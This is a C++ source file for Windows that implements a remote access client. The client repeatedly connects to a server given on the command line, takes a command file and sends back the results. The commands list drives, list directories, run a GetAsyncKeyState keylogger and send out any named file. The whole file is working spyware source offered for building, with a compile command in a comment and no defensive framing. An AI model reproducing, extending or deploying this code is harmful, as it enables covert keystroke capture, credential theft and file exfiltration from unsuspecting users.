#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <Windows.h>
#include <string>
#include <fstream>
#include <conio.h>
#include <cwchar> 
#include <chrono>

class Client{
    private:
        WSADATA wsaData;
        SOCKET clientSocket;
        SOCKADDR_IN serverAddr;
        int port;
        char buffer[1024];
        char *ip;
    public:
        Client(int x, char *y){
            port = x; ip = y;
        };
        void initLib();
        void initClient();
        void connection();
        void transportInfo();
        int sendfile(std::string filename);
        int getfile(char filename[256]);
        void stop();
};

void Client::initLib(){
    WSAStartup(MAKEWORD(2, 2), &wsaData);};

void Client::initClient(){
    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(ip);
    setsockopt(clientSocket,SOL_SOCKET,SO_SNDBUF,(char *)&buffer,sizeof(buffer));
    setsockopt(clientSocket,SOL_SOCKET,SO_RCVBUF,(char *)&buffer,sizeof(buffer));};

void Client::connection(){
    connect(clientSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr));
    std::cout << "connect" << std::endl;
    };

void Client::transportInfo(){
    recv(clientSocket, buffer, sizeof(buffer), 0);
    std::cout << "Received: " << buffer << std::endl;};

void Client::stop(){
    closesocket(clientSocket);
    WSACleanup();};

int Client::getfile(char filename[256]){
    std::ofstream file(filename, std::ios::binary);
    int byteRead;
    do {
        byteRead = recv(clientSocket, buffer, 1024, 0);
        if (byteRead > 0){
            file.write(buffer, byteRead); //file.write(buffer, 1024)
        if (byteRead < 0){
            std::cout << "error get file" << std::endl;
        return -1;};};}while(byteRead > 0);
        file.close();
        std::cout << "get file succsess" << std::endl;};
int Client::sendfile(std::string filename){
        std::ifstream file(filename, std::ios::binary);
    if (!file.is_open()){
        std::cerr << "error read file" << errno << std::endl;
        return -1;};
    int readBuffer;
    while((readBuffer = file.readsome(buffer, 1024)) > 0){
    if(send(clientSocket, buffer, readBuffer, 0) == SOCKET_ERROR){
        std::cerr << "error send file" << WSAGetLastError() << std::endl;
        return -1;};};
    file.close();
    return 0;}
void listDir(const std::string& path) {
    WIN32_FIND_DATA data;
    std::string searchPath = path + "\\*";
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &data);
    std::ofstream file("temp.bin");
    file << "infobypath" << std::endl;
    if (hFind == INVALID_HANDLE_VALUE) {
        file << "Error: Unable to open directory: " << path << std::endl;
        return;
    }

    do {
        if (strcmp(data.cFileName, ".") != 0 && strcmp(data.cFileName, "..") != 0) {
            if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                file << "Directory: " << data.cFileName << std::endl;
            } else {
                file << "File: " << data.cFileName << std::endl;
      }
    }
    } while (FindNextFileA(hFind, &data));
    file.close();
    FindClose(hFind);
};
void getDisk() {
  DWORD numDrives = GetLogicalDriveStrings(0, nullptr);
  char drives[1024];
  GetLogicalDriveStrings(numDrives, drives);
  std::ofstream file("temp.bin");
  file << "diskinfo" << std::endl;
  for (char* drive = drives; *drive; drive += strlen(drive) + 1) {
    if (GetDriveType(drive) == DRIVE_FIXED) {
      file << "Drive: " << drive << std::endl;
      ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes;
      GetDiskFreeSpaceEx(drive, &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes);
      file << "Free Space: " << (double)freeBytesAvailable.QuadPart / (1024 * 1024 * 1024) << " GB" << std::endl;

      file << "--------------------" << std::endl;
    }
  }
    file.close();
    return;
}
void error(std::string filename){
    std::ofstream file(filename);
    file << "infobypath" << std::endl;
    file << "no tag for file\n";
    file.close();
};

void writer(int _key, char *file){
    using namespace std;
    cout<< _key << endl;
    Sleep(10);
    FILE *OUTPUT_FILE; // can also use the ofstream command
    OUTPUT_FILE = fopen(file, "a+"); //a+ is used to add new keys each time, and not overwrite
    switch(_key)
    {
        case VK_SHIFT: fprintf(OUTPUT_FILE, "[SHIFT]");
            break;
        case VK_BACK: fprintf(OUTPUT_FILE, "[BACKSPACE]");
            break;
        case VK_LBUTTON: fprintf(OUTPUT_FILE, "[LBUTTON]");
            break;
        case VK_RBUTTON: fprintf(OUTPUT_FILE, "[RBUTTON]");
            break;
        case VK_RETURN: fprintf(OUTPUT_FILE, "[ENTER]");
            break;
        case VK_TAB: fprintf(OUTPUT_FILE, "[TAB]");
            break;
        case VK_ESCAPE: fprintf(OUTPUT_FILE, "[ESCAPE]");
            break;
        case VK_CONTROL: fprintf(OUTPUT_FILE, "[Ctrl]");
            break;
        case VK_MENU: fprintf(OUTPUT_FILE, "[Alt]");
            break;
        case VK_CAPITAL: fprintf(OUTPUT_FILE, "[CAPS Lock]");
            break;
        case VK_SPACE: fprintf(OUTPUT_FILE, "[SPACE]");
            break;
    }
    fprintf(OUTPUT_FILE, "%s", &_key);
    fclose(OUTPUT_FILE);
}

void keylogger(char *filename){
    char i;
    int flag = 1;
    std::ofstream file("temp.bin");
    file << "keylogger" << std::endl;
    std::cout<<"working"<<std::endl;
    auto startTime = std::chrono::high_resolution_clock::now();
    Sleep(10);
    for(i=8; i<256; i++) {
        if(GetAsyncKeyState(i)== -32767){
            writer(i, filename);
            if (std::chrono::duration_cast<std::chrono::seconds>(std::chrono::high_resolution_clock::now() - startTime).count() > 20) {
                file.close();
                flag = 0;
                file.close();
                return;
            }
        } if(flag == 0){file.close();return;};
    }
    file.close();
    return;
};

std::string checkFile(std::string filename) {
    std::string value;
    std::ifstream file(filename);
    if (file.is_open()) {
        std::getline(file, value);
        if (value == "getinfoofdisks") {
            getDisk();
            file.close();
            return "temp.bin";
        }
        else if (value == "infobypath") {
            std::string path;
            std::getline(file, path);
            listDir(path);
            file.close();
            return "temp.bin"; 
            }
            else if (value == "keylogger") {
                keylogger("temp.bin");
                file.close();
                return "temp.bin";
            }
            else if (value == "sendfile"){
                std::getline(file, value);
                return value;
            }
            else{
                error("temp.bin");
                return "temp.bin";
            }
        }
};
//g++ code.cpp -o code.exe -lm -lmingw32
int main(int argc, char **args){
    int prt = std::stoi(args[1]);
    Client client(prt, args[2]);
    std::string path;
    while (true){
        client.initLib();
        client.initClient();
        client.connection();
        client.getfile("command.bin");
        path = checkFile("command.bin");
        client.stop();
        Sleep(1000);
        client.initLib();
        client.initClient();
        client.connection();
        Sleep(1000);
        client.sendfile(path);
        client.stop();
        Sleep(1000);
    };
    return 0;
};
